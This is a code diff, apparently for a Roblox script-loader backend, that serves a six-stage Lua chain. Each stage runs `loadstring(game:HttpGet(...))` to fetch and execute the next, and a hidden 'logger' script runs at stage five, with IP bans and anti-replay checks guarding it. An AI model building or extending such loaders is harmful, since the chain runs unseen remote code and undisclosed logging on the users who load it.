@@ -61,7 +61,7 @@ function makeSession(ownerIp, stepSequence, currentIndex) {
         nextKey: nextKey,
         lastTime: now,
         requiredWait: waitTime,
-        used: false  // langsung expired begitu used = true dan session didelete
+        used: false
     };
 
     return { newSessionID, nextKey, waitTime };
@@ -112,7 +112,6 @@ module.exports = async function(req, res) {
                 return res.status(getRandomError()).send("SECURITY : BANNED ACCESS!");
             }
             
-            // Replay attack: session sudah dipakai
             if (session.used === true) {
                 blacklist[cleanIp] = true;
                 await sendSecurityLogToLogJs("🚫 **REPLAY ATTACK** - Mencoba akses ulang link mati", cleanIp, "replay_attack");
@@ -133,7 +132,6 @@ module.exports = async function(req, res) {
                 return res.status(getRandomError()).send("SECURITY : BANNED ACCESS!");
             }
 
-            // Tandai used, session akan didelete di handler masing-masing layer
             session.used = true;
         }
         
@@ -160,28 +158,28 @@ module.exports = async function(req, res) {
          * idx 0 → layer 1 → redirect biasa
          * idx 1 → layer 2 → redirect biasa
          * idx 2 → layer 3 → redirect biasa
-         * idx 3 → layer 4 → redirect biasa
-         * idx 4 → layer 5 → logger (coroutine) + loadstring ke layer 6
+         * idx 3 → layer 4 → redirect ke layer 5 (logger)
+         * idx 4 → layer 5 → logger (coroutine) + redirect ke layer 6
          * idx 5 → layer 6 → main script SAJA ✅
          */
 
-        // ========== LAYER 6 (idx = TOTAL_LAYERS - 1): MAIN SCRIPT SAJA ==========
+        // ========== LAYER 6 (idx 5 = TOTAL_LAYERS - 1): MAIN SCRIPT SAJA ==========
         if (idx === SETTINGS.TOTAL_LAYERS - 1) {
             const mainScript = await fetchRaw(SETTINGS.REAL_SCRIPT_URL);
             delete sessions[id];
             return res.status(200).send(mainScript || '');
         }
 
-        // ========== LAYER 5 (idx = TOTAL_LAYERS - 2): LOGGER COROUTINE + LOADSTRING KE LAYER 6 ==========
+        // ========== LAYER 5 (idx 4 = TOTAL_LAYERS - 2): LOGGER + REDIRECT KE LAYER 6 ==========
         if (idx === SETTINGS.TOTAL_LAYERS - 2) {
-            const nextIndex = idx + 1;
+            const nextIndex = idx + 1; // = 5
+            const nextStepNumber = session.stepSequence[nextIndex]; // ambil SEBELUM delete
             const { newSessionID, nextKey, waitTime } = makeSession(
                 session.ownerIP, session.stepSequence, nextIndex
             );
             delete sessions[id];
 
             const loggerScript = await fetchRaw(SETTINGS.LOGGER_SCRIPT_URL);
-            const nextStepNumber = session.stepSequence[nextIndex];
             const nextUrl = "https://" + host + currentPath + "?" + nextStepNumber + "." + newSessionID + "." + nextKey;
 
             const luaScript = "coroutine.wrap(function()\n" +
@@ -195,12 +193,12 @@ module.exports = async function(req, res) {
 
         // ========== LAYER 1-4 (idx 0,1,2,3): REDIRECT BIASA ==========
         const nextIndex = idx + 1;
+        const nextStepNumber = session.stepSequence[nextIndex]; // ambil SEBELUM delete
         const { newSessionID, nextKey, waitTime } = makeSession(
             session.ownerIP, session.stepSequence, nextIndex
         );
         delete sessions[id];
 
-        const nextStepNumber = session.stepSequence[nextIndex];
         const nextUrl = "https://" + host + currentPath + "?" + nextStepNumber + "." + newSessionID + "." + nextKey;
         const luaScript = "task.wait(" + (waitTime / 1000) + ") loadstring(game:HttpGet(\"" + nextUrl + "\"))()";
         return res.status(200).send(luaScript);
